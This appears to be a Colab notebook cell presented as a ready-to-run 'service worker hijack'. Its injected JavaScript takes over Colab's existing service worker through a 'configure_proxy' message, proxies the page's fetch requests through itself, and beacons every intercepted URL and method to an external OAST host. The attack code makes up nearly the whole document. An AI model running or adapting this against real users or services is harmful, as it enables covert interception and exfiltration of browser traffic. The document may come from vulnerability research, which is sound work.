# Service Worker Hijack (Auto‑Execute)

**Run the cell below.** The JavaScript will hijack the existing Colab service worker, then automatically send a test fetch to `httpbin.org`.
You will see a green dot at bottom‑right when the hijack is active.
Check your Oast server for `/START`, `/SW_HIJACKED`, and `/FETCH` beacons.

In [ ]:
from IPython.display import display, Javascript
import time
print('🚀 Deploying service worker hijack...')
display(Javascript("\n(function() {\n    const OAST = 'https://3lpv9gwt1zmwxwbu5hnbw0ckdutp48vv8.oast.site';\n    new Image().src = OAST + '/START';\n\n    let hijackActive = false;\n\n    function logBeacon(path, data) {\n        new Image().src = OAST + '/' + path + '?' + (data ? 'msg=' + encodeURIComponent(data) : '');\n    }\n\n    function addGreenDot() {\n        let dot = document.getElementById('sw-dot');\n        if (!dot) {\n            dot = document.createElement('div');\n            dot.id = 'sw-dot';\n            dot.style.cssText = 'position:fixed;bottom:10px;right:10px;width:12px;height:12px;background:#0f0;border-radius:50%;z-index:999999;';\n            document.body.appendChild(dot);\n        }\n    }\n\n    function hijack() {\n        if (!navigator.serviceWorker) {\n            logBeacon('ERROR', 'no_sw');\n            return;\n        }\n        navigator.serviceWorker.ready.then(reg => {\n            const sw = reg.active;\n            if (!sw) {\n                setTimeout(hijack, 500);\n                return;\n            }\n            const fetchChannel = new MessageChannel();\n            const responseChannel = new MessageChannel();\n            const fetchPort = fetchChannel.port1;\n            const responsePort = responseChannel.port1;\n\n            fetchPort.onmessage = async (e) => {\n                const d = e.data;\n                if (d.action !== 'fetch') return;\n                logBeacon('FETCH', 'url=' + encodeURIComponent(d.url) + '&method=' + d.method);\n                try {\n                    const res = await fetch(d.url, { method: d.method, headers: d.headers, body: d.body });\n                    const data = await res.arrayBuffer();\n                    const headers = {};\n                    for (let [k,v] of res.headers.entries()) headers[k] = v;\n                    fetchPort.postMessage({\n                        action: 'response',\n                        responseId: d.requestId,\n                        response: { status: res.status, statusText: res.statusText, headers: headers, data: data }\n                    });\n                } catch(err) {\n                    fetchPort.postMessage({\n                        action: 'response',\n                        responseId: d.requestId,\n                        error: err.toString()\n                    });\n                }\n            };\n\n            responsePort.onmessage = (e) => {\n                if (e.data && e.data.configured) {\n                    hijackActive = true;\n                    addGreenDot();\n                    logBeacon('SW_HIJACKED', '');\n                    console.log('%c\u2705 Service worker hijacked', 'color:green');\n                    // Send a test fetch automatically to verify interception\n                    setTimeout(() => {\n                        fetch('https://httpbin.org/get?verify=' + Date.now())\n                            .then(() => console.log('Test fetch sent'))\n                            .catch(e => console.error('Test fetch failed', e));\n                    }, 1000);\n                }\n            };\n\n            sw.postMessage({\n                action: 'configure_proxy',\n                serviceWorkerPort: fetchPort,\n                responsePort: responsePort\n            }, [fetchPort, responsePort]);\n        }).catch(e => logBeacon('ERROR', e.toString()));\n    }\n\n    hijack();\n})();\n"))
print('✅ JavaScript injected. Check your Oast server for /START, /SW_HIJACKED, and /FETCH.')
print('A green dot will appear at bottom-right when active.')
